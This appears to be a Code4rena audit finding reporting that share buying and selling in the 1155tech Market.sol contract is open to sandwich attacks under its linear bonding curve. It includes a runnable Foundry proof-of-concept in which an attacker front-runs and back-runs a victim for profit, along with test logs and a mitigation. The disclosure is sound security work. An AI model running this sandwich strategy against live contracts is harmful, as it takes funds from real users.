# Buying and selling shares in the `Market.sol` is vulnerable to sandwich attacks

## Bug description

`1155tech` part of this protocol is an art protocol where the users can buy/sell shares, earn interest with those shares, or mint/burn NFTs using these shares.

There are two main things here: shares and NFTs.

Users must buy shares first.

* Shares earn interest.  
    Users can earn some portion of the fee generated by volume of this collection just by holding shares. This is called holder's cut.
    
* Shares can be switched to NFTs by paying the NFT minting fee.  
    The shares switched to NFTs do **not** earn interest.  
    This action decreases the shares in circulation (not the total share count).
    

As mentioned in the protocol's Code4rena contest page, users may not have incentives to mint more than 1 NFT. However, this is not the case for the shares as they earn interest.  
Users will want to have more shares to get more interest, especially if it's an art collection with a high secondary market volume.

Share prices are determined by a bonding curve. It is a [linear bonding curve](https://github.com/code-423n4/2023-11-canto/blob/335930cd53cf9a137504a57f1215be52c6d67cb3/1155tech-contracts/src/bonding_curve/LinearBondingCurve.sol#L14C1-L25C6) at the moment. The price of one share increases with the share count.

```solidity
    function getPriceAndFee(uint256 shareCount, uint256 amount)
        external
        view
        override
        returns (uint256 price, uint256 fee)
    {
        for (uint256 i = shareCount; i < shareCount + amount; i++) {
            uint256 tokenPrice = priceIncrease * i;
            price += tokenPrice;
            fee += (getFee(i) * tokenPrice) / 1e18;
        }
    } 
```

Users buy the lowest-priced share first when buying and the price increases after every buy.  
They sell the highest-priced share first when selling and the price decreases after every sale.  
[https://github.com/code-423n4/2023-11-canto/blob/335930cd53cf9a137504a57f1215be52c6d67cb3/1155tech-contracts/src/Market.sol#L132C1-L136C6  
https://github.com/code-423n4/2023-11-canto/blob/335930cd53cf9a137504a57f1215be52c6d67cb3/1155tech-contracts/src/Market.sol#L141C1-L145C6](https://github.com/code-423n4/2023-11-canto/blob/335930cd53cf9a137504a57f1215be52c6d67cb3/1155tech-contracts/src/bonding_curve/LinearBondingCurve.sol#L14C1-L25C6)

```solidity
    function getBuyPrice(uint256 _id, uint256 _amount) public view returns (uint256 price, uint256 fee) {
        // If id does not exist, this will return address(0), causing a revert in the next line
        address bondingCurve = shareData[_id].bondingCurve;
        (price, fee) = IBondingCurve(bondingCurve).getPriceAndFee(shareData[_id].tokenCount + 1, _amount);
    }
//--------------
    function getSellPrice(uint256 _id, uint256 _amount) public view returns (uint256 price, uint256 fee) {
        // If id does not exist, this will return address(0), causing a revert in the next line
        address bondingCurve = shareData[_id].bondingCurve;
        (price, fee) = IBondingCurve(bondingCurve).getPriceAndFee(shareData[_id].tokenCount - _amount + 1, _amount);
    }
```

This price calculation makes the protocol vulnerable to sandwich attacks.

As I mentioned above, users are incentivized to buy multiple shares. If a user wants to buy 10 shares, an attacker can:

1. Buy 10 shares with a lower price, which will increase the price of the shares.
    
2. The user buys his/her 10 shares at a high price, and this increases the price higher.
    
3. The attacker sells those 10 shares immediately and gains profit.
    

Down below, you can find a coded PoC that demonstrates this scenario.  
Note: The same thing can happen for the opposite scenario too. Attacker can sell just before regular users sell their shares, and buy them back at the lower price

## Impact

* Users will buy shares with higher price or sell shares with lower price
    
* Attacker will gain immediate profit even after paying the fee
    

## Proof of Concept

### Coded PoC

You can use the protocol's own setup to test this PoC.  
\- Copy and paste the snippet into the `Market.t.sol` test file.  
\- Change `1e18` to a greater value like `1e20` in this [line](https://github.com/code-423n4/2023-11-canto/blob/335930cd53cf9a137504a57f1215be52c6d67cb3/1155tech-contracts/src/test/Market.t.sol#L28C9-L28C56)  
\- Run it with `forge test --match-test testSandwich -vvv`

```solidity
function testSandwich() public {
        // ----------------------------- PREPARE --------------------------------------
        // Create addresses and send some token to them
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        token.transfer(attacker, 1 ether);
        token.transfer(victim, 1 ether);

        // Attacker and victim has 1 ether token balances each before the attack
        assertEq(token.balanceOf(attacker), 1 ether);
        assertEq(token.balanceOf(victim), 1 ether);

        // Approve
        vm.prank(attacker);
        token.approve(address(market), type(uint256).max);
        vm.prank(victim);
        token.approve(address(market), type(uint256).max);

        // Create a new share. Share id is 1.
        // Let's assume these shares already has some activity and other people bought some before (50 shares).
        testCreateNewShare();
        token.approve(address(market), type(uint256).max);
        market.buy(1, 50);
        
        // --------------------------- ATTACK --------------------------------------------      
        // Victim is going to buy 10 shares.
        // Attacker sandwiches the victim.
        
        // Attacker buys 10 shares
        vm.prank(attacker);
        market.buy(1, 10);

        // Victim buys 10 shares
        vm.prank(victim);
        market.buy(1, 10);

        // Attacker sells 10 shares
        vm.prank(attacker);
        market.sell(1, 10);

        // Attacker's balance is greater than before even after paying all the fees when buying and selling
        assertGt(token.balanceOf(attacker), 1 ether);
        console2.log("attacker balance: ", token.balanceOf(attacker)); // => 1078541721428571432 -------> 7% gain for with only 1 ether. 
    }
```

The test is performed with only 1 ether and a small number of shares just for demonstration, and the impact might be much higher depending on the current share count, price and how many shares will be minted.

The results are here:

```solidity
Running 1 test for src/test/Market.t.sol:MarketTest
[PASS] testSandwich() (gas: 640266)
Logs:
  attacker balance:  1078541721428571432

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 27.32ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Tools Used

Manual review, foundry

## Recommended Mitigation Steps

I acknowledge that the price increase is the nature of linear bonding curve. We can't prevent that. However, the sandwich attacks might be discouraged. For example there might be an enforced waiting period between buying and selling shares. Attackers can still front-run and buy shares at the lower price. However, they have to take the risk of the price going down during the waiting period which might discourage them.

---

**Note:** The original submission can be found [here](https://github.com/code-423n4/2023-11-canto-findings/issues/283).
